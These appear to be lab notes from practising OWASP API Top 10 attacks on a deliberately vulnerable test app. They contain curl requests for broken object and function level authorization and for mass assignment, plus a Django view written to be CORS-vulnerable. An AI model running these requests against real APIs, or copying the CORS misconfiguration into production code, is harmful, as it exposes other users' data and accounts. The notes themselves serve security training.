## API1 - Broken Object Level Authorization
1- access user2 vehicle report 
2- replace vid with "2609GBX1C25X54404"

## API3 - Excessive Data Exposure

1- just access community and check email and vehicle id 

## API5 - BFLA - Delete a video of someone else.
- upload an image at users "ahmed" & "newuser"
/identity/api/v2/user/videos/102
/identity/api/v2/user/videos/103
- with token of user "user2" delete the uploaded video of other users
```python unfold ln:false unwrap title:"code"
curl http://10.1.10.104/identity/api/v2/user/videos/XX  -H "Authorization: Bearer $token"

curl -X DELETE  http://10.1.10.104/identity/api/v2/admin/videos/XX  -H "Authorization: Bearer $token" -H "Content-Type: application/json"

curl http://10.1.10.104/identity/api/v2/user/videos/XX  -H "Authorization: Bearer $token"
```


## Mass
- make an order
- return the order and change the quantity 
```zsh unfold ln:false unwrap title:"PUT"
curl -X PUT  http://10.1.10.104/workshop/api/shop/orders/15 -d '{"quantity":100,"status":"returned"}' -H "Authorization: Bearer $token_newuser" -H "Content-Type: application/json"
```

```zsh unfold ln:false unwrap title:"PUT"
curl http://10.1.10.104/workshop/api/shop/orders/15 -H "Authorization: Bearer $token_newuser"
```


```zsh unfold ln:false unwrap title:"PUT"
curl -X PUT  http://10.1.10.104/workshop/api/shop/orders/15 -d '{"quantity":100,"status":"returned"}' -H "Authorization: Bearer $token" -H "Content-Type: application/json"
```
```zsh unfold ln:false unwrap title:"PUT"
curl -X PUT  http://10.1.10.104/workshop/api/shop/orders/15 -d '{"quantity":100,"status":"returned"}' -H "Authorization: Bearer $token" -H "Content-Type: application/json"
```



newuser video id 103
ahmed video id 102


```python unfold ln:false unwrap title:"code"
from django.utils.decorators import method_decorator
from django.views.decorators.csrf import csrf_exempt

@method_decorator(csrf_exempt, name='dispatch')
class CORSVulnerableView(APIView):
    """
    Intentionally CORS-vulnerable endpoint for security testing.
    Misconfigs simulated:
    1. Reflects any Origin back (trusts arbitrary origin)
    2. Access-Control-Allow-Credentials: true
    3. Returns sensitive user data
    """

    @jwt_auth_required
    def get(self, request, user=None):
        origin = request.META.get("HTTP_ORIGIN", "*")
        user_details = UserDetails.objects.get(user=user)
        orders = Order.objects.filter(user=user).order_by("-id")[:5]
        order_serializer = OrderSerializer(orders, many=True)

        response_data = {
            "user_email": user.email,
            "user_number": user.number,
            "available_credit": user_details.available_credit,
            "recent_orders": order_serializer.data,
        }

        response = Response(response_data, status=status.HTTP_200_OK)

        # ❌ CORS Misconfiguration 1: Reflects any Origin blindly
        response["Access-Control-Allow-Origin"] = origin
        # ❌ CORS Misconfiguration 2: Credentials allowed from any origin
        response["Access-Control-Allow-Credentials"] = "true"
        response["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
        response["Access-Control-Allow-Headers"] = "Authorization, Content-Type"

        return response

    @jwt_auth_required
    def post(self, request, user=None):
        origin = request.META.get("HTTP_ORIGIN", "*")
        user_details = UserDetails.objects.get(user=user)

        response = Response(
            {
                "message": "Sensitive action performed!",
                "user_email": user.email,
                "credit": user_details.available_credit,
            },
            status=status.HTTP_200_OK,
        )

        # ❌ Same CORS misconfigs on POST
        response["Access-Control-Allow-Origin"] = origin
        response["Access-Control-Allow-Credentials"] = "true"
        response["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
        response["Access-Control-Allow-Headers"] = "Authorization, Content-Type"

        return response

    # ❌ Preflight handler — blindly allows any origin
    def options(self, request, *args, **kwargs):
        origin = request.META.get("HTTP_ORIGIN", "*")
        response = Response(status=status.HTTP_200_OK)
        response["Access-Control-Allow-Origin"] = origin
        response["Access-Control-Allow-Credentials"] = "true"
        response["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
        response["Access-Control-Allow-Headers"] = "Authorization, Content-Type"
        return response
```
